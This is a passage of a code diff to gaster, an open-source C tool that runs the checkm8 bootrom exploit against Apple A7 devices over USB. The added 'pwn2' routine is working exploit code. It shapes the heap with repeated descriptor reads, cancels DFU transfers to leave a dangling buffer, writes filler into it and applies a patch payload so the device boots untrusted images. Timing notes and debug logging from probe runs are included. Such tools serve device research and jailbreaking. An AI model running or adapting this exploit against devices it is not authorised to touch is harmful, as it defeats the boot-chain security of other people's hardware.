+	(void)completed_stage;
+	(void)success;
+#endif
+	reset_usb_handle(handle);
+}
+
+/* Reference three-phase flow for the A7 large-leak configuration,
+ * following the original checkm8 implementation rather than the stall
+ * spray variant: phase 1 shapes the heap with descriptor reads, phase 2
+ * re-arms the DFU buffer, phase 3 applies the gaster patch payload. */
+static bool
+gaster_ipwndfu_a7(usb_handle_t *handle) {
+	bool pwned = false;
+	size_t i;
+	int t;
+
+	init_usb_handle(handle, APPLE_VID, DFU_MODE_PID);
+	if(!wait_usb_handle(handle, checkm8_check_usb_device, &pwned)) {
+		return false;
+	}
+	if(pwned) {
+		puts("Already in pwned mode.");
+		return true;
+	}
+	if(cpid != 0x8960) {
+		printf("pwn2: unsupported CPID %04X.\n", cpid);
+		return false;
+	}
+	if(config_large_leak == 0) {
+		puts("pwn2: device config has no large leak.");
+		return false;
+	}
+
+	puts("pwn2 phase 1: heap shaping with descriptor reads");
+	/* Generous per-request budget: a mid-flight timeout would cancel
+	 * a transfer the same way the 1 ms host-side abort did. */
+	t = 100;
+#ifdef GASTER_NETBSD_NATIVE
+	(void)ioctl(handle->fd, USB_SET_TIMEOUT, &t);
+#endif
+	{
+		transfer_ret_t probe;
+		int pre;
+
+		/* Four descriptor reads before the primer align the ROM
+		 * heap with the reference host baseline: without them the
+		 * primer corruption kills the USB task after one request;
+		 * with them the leak reads keep completing (probe variant 3,
+		 * 2026-10-23). */
+		for(pre = 0; pre < 4; ++pre) {
+			send_usb_control_request_no_data(handle, 0x80, 6, 0x0304, 0x040A, 0x40, &probe);
+		}
+		fprintf(stderr, "[pwn2] prelude: 4 reads, last ret=%d errno=%d\n", (int)probe.ret, gaster_dbg_sync_errno);
+#ifdef GASTER_NETBSD_NATIVE
+		checkm8_stall_async_prime(handle, &probe);
+		fprintf(stderr, "[pwn2] initial stall (async-cancel): ret=%d errno=%d\n", (int)probe.ret, gaster_dbg_async_errno);
+#else
+		send_usb_control_request_no_data(handle, 2, 3, 0, 0x80, 0, &probe);
+		fprintf(stderr, "[pwn2] initial stall: ret=%d errno=%d\n", (int)probe.ret, gaster_dbg_sync_errno);
+#endif
+	}
+		size_t dead = 0;
+
+		for(i = 0; i < config_large_leak; ++i) {
+			/* The reference relies on natural completion; its 1 ms
+			 * timeout is only insurance.  A fixed host-side cancel at
+			 * 1 ms lands mid-transfer as soon as the growing heap
+			 * slows the ROM down, and that cancel kills the responsive
+			 * state (probe battery 2026-10-23: without cancels every
+			 * read completes).  Run the leaks synchronously with the
+			 * generous phase timeout instead. */
+			transfer_ret_t leak_ret;
+
+			send_usb_control_request_no_data(handle, 0x80, 6, 0x0304, 0x040A, 0x40, &leak_ret);
+			if(leak_ret.ret == USB_TRANSFER_OK) {
+				dead = 0;
+			} else if(++dead > 8) {
+				fprintf(stderr, "[pwn2] leak %zu/%zu: no reply for %zu reads, heap state lost\n",
+				    i, config_large_leak, dead);
+				return false;
+			}
+			if((i & 0x3FF) == 0) {
+				struct timespec now;
+				clock_gettime(CLOCK_MONOTONIC, &now);
+				fprintf(stderr, "[pwn2] leak %zu/%zu ret=%d errno=%d t=%lld.%03ld\n",
+				    i, config_large_leak, (int)leak_ret.ret, gaster_dbg_sync_errno,
+				    (long long)(now.tv_sec), now.tv_nsec / 1000000);
+			}
+		}
+	{
+		transfer_ret_t tail;
+
+		send_usb_control_request_no_data(handle, 0x80, 6, 0x0304, 0x040A, 0x41, &tail);
+		fprintf(stderr, "[pwn2] no_leak: ret=%d errno=%d\n", (int)tail.ret, gaster_dbg_sync_errno);
+	}
+	fprintf(stderr, "[pwn2] phase 1 done, resetting\n");
+	reset_usb_handle(handle);
+	close_usb_handle(handle);
+
+	puts("pwn2 phase 2: DFU buffer re-arm");
+	if(!wait_usb_handle(handle, checkm8_check_usb_device, &pwned)) {
+		return false;
+	}
+	{
+		static uint8_t filler[0x580];
+		int t10 = 100;
+
+		transfer_ret_t p2;
+		bool ok;
+
+		memset(filler, 'A', sizeof(filler));
+#ifdef GASTER_NETBSD_NATIVE
+		/* The reference cancels the DNLOAD about 0.1 ms after the
+		 * transfer reaches the wire, at the start of the data
+		 * stream.  Cancel without a delay fires before the data
+		 * phase and leaves no dangling buffer. */
+		checkm8_hammer_cancel_delay(handle, 0x21, DFU_DNLOAD, 0, 0, DFU_MAX_TRANSFER_SZ, 200, &p2);
+		fprintf(stderr, "[p2] abort-dnload ok=%d ret=%d errno=%d\n", ok = true, (int)p2.ret, gaster_dbg_async_errno);
+		/* Reference staging: park the DFU buffer at the overwrite
+		 * offset with a plain (0,0) write. */
+		{
+			int t10 = 10;
+
+			(void)ioctl(handle->fd, USB_SET_TIMEOUT, &t10);
+		}
+		ok = send_usb_control_request(handle, 0, 0, 0, 0, filler, 0x580, &p2);
+		fprintf(stderr, "[p2] filler(0,0) ok=%d ret=%d sz=%u errno=%d\n", ok, (int)p2.ret, p2.sz, gaster_dbg_sync_errno);
+		if(p2.ret != USB_TRANSFER_OK) {
+			/* Distinguish a wrong staging request from a wrong
+			 * heap state: try the DNLOAD form of the same write. */
+			ok = send_usb_control_request(handle, 0x21, DFU_DNLOAD, 0, 0, filler, 0x580, &p2);
+			fprintf(stderr, "[p2] filler(dnload-fallback) ok=%d ret=%d sz=%u errno=%d\n", ok, (int)p2.ret, p2.sz, gaster_dbg_sync_errno);
+		}
+#else
+		ok = send_usb_control_request_async_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, DFU_MAX_TRANSFER_SZ, 0, &p2);
+		fprintf(stderr, "[p2] abort-dnload ok=%d ret=%d errno=%d\n", ok, (int)p2.ret, gaster_dbg_async_errno);
+		ok = send_usb_control_request(handle, 0x21, DFU_DNLOAD, 0, 0, filler, sizeof(filler), &p2);
+		fprintf(stderr, "[p2] filler(dnload) ok=%d ret=%d sz=%u errno=%d\n", ok, (int)p2.ret, p2.sz, gaster_dbg_sync_errno);
+#endif
+		{
+			/* CLR_STATUS also needs a real timeout on the corrupted heap. */
+			int t100 = 100;
+#ifdef GASTER_NETBSD_NATIVE
+			(void)ioctl(handle->fd, USB_SET_TIMEOUT, &t100);
+#endif
+			ok = send_usb_control_request_no_data(handle, 0x21, DFU_CLR_STATUS, 0, 0, 0, &p2);
+		}
+		fprintf(stderr, "[p2] clr ok=%d ret=%d errno=%d\n", ok, (int)p2.ret, gaster_dbg_sync_errno);
+	}
+	close_usb_handle(handle);
+	sleep_ms(500);
+	fprintf(stderr, "[p2] phase 2 complete\n");
+
+	puts("pwn2 phase 3: patch payload");
+	if(!wait_usb_handle(handle, checkm8_check_usb_device, &pwned)) {
+		return false;
+	}
+	t = (int)usb_timeout;
+	gaster_fork_phase3 = 1;
+#ifdef GASTER_NETBSD_NATIVE
+	(void)ioctl(handle->fd, USB_SET_TIMEOUT, &t);
+#endif
+	if(!checkm8_stage_patch(handle)) {
+		puts("pwn2: patch stage failed.");
+		return false;
+	}
+	reset_usb_handle(handle);
+	close_usb_handle(handle);
+
+	if(!wait_usb_handle(handle, checkm8_check_usb_device, &pwned)) {
+		return false;
+	}
+	if(pwned) {
+		puts("Now you can boot untrusted images.");
+	}
+	return pwned;
+}
+
 static bool
 gaster_checkm8(usb_handle_t *handle) {
-	enum {
-		STAGE_RESET,
-		STAGE_SETUP,
-		STAGE_SPRAY,
-		STAGE_PATCH,
-		STAGE_PWNED
-	} stage = STAGE_RESET;
+	enum checkm8_stage stage = STAGE_RESET;
 	bool ret, pwned;
+	const char *setup_only = getenv("GASTER_SETUP_ONLY");
 
 	init_usb_handle(handle, APPLE_VID, DFU_MODE_PID);
 	while(stage != STAGE_PWNED && wait_usb_handle(handle, checkm8_check_usb_device, &pwned)) {
+		if(setup_only != NULL && stage == STAGE_SPRAY) {
+			puts("SETUP_ONLY: stopping before spray, ROM primed.");
+			return true;
+		}
 		if(!pwned) {
+			const enum checkm8_stage completed_stage = stage;
+
 			if(stage == STAGE_RESET) {
 				puts("Stage: RESET");
 				ret = checkm8_stage_reset(handle);
@@ -1265,7 +1994,7 @@ gaster_checkm8(usb_handle_t *handle) {
 				puts("ret: false");
 				stage = STAGE_RESET;
 			}
-			reset_usb_handle(handle);
+			reset_usb_handle_after_stage(handle, completed_stage, ret);
 		} else {
 			stage = STAGE_PWNED;
 			puts("Now you can boot untrusted images.");
@@ -1412,7 +2141,7 @@ img4_init(const uint8_t *src, size_t src_len, img4_t *img4) {
 
 static bool
 aes_256_cbc_decrypt(const uint8_t *key, const uint8_t *iv, const uint8_t *data_src, uint8_t *data_dst, size_t data_sz) {
-#ifdef HAVE_LIBUSB
+#if defined(HAVE_LIBUSB) || defined(GASTER_NETBSD_NATIVE)
 	EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
 	bool ret = false;
 	int out_sz;
@@ -1628,10 +2357,20 @@ main(int argc, char **argv) {
 	int ret = EXIT_FAILURE;
 	usb_handle_t handle;
 
+	setvbuf(stdout, NULL, _IOLBF, 0);
+	gaster_skip_reset = getenv("GASTER_SKIP_RESET") != NULL;
+
 	if(env_usb_timeout == NULL || sscanf(env_usb_timeout, "%u", &usb_timeout) != 1 || usb_timeout < 1) {
 		usb_timeout = 5;
 	}
 	printf("usb_timeout: %u\n", usb_timeout);
+#if defined(GASTER_NETBSD_NATIVE) && !defined(HAVE_LIBUSB)
+	if (!configure_usb_poll_interval()) {
+		fputs("USB_POLL_INTERVAL_MS must contain decimal digits in 1..1000 ms.\n", stderr);
+		return EXIT_FAILURE;
+	}
+	printf("usb_poll_interval_ms: %u\n", usb_poll_interval_ms);
+#endif
 	if(env_usb_abort_timeout_min == NULL || sscanf(env_usb_abort_timeout_min, "%u", &usb_abort_timeout_min) != 1 || usb_abort_timeout_min > usb_timeout) {
 		usb_abort_timeout_min = 0;
 	}
@@ -1640,6 +2379,10 @@ main(int argc, char **argv) {
 		if(gaster_reset(&handle)) {
 			ret = 0;
 		}
+	} else if(argc == 2 && strcmp(argv[1], "pwn2") == 0) {
+		if(gaster_ipwndfu_a7(&handle)) {
+			ret = 0;
+		}
 	} else if(argc == 2 && strcmp(argv[1], "pwn") == 0) {
 		if(gaster_checkm8(&handle)) {
 			ret = 0;
@@ -1657,6 +2400,10 @@ main(int argc, char **argv) {
 		puts("env:");
 		puts("USB_TIMEOUT - USB timeout in ms");
 		puts("USB_ABORT_TIMEOUT_MIN - USB abort timeout minimum in ms");
+#if defined(GASTER_NETBSD_NATIVE) && !defined(HAVE_LIBUSB)
+		puts("USB_POLL_INTERVAL_MS - Device search interval in ms, 1..1000 (default: USB_TIMEOUT)");
+		puts("GASTER_SKIP_SPRAY_RESET - Skip reset after successful SPRAY (diagnostic)");
+#endif
 		puts("options:");
 		puts("reset - Reset DFU state");
 		puts("pwn - Put the device in pwned DFU mode");
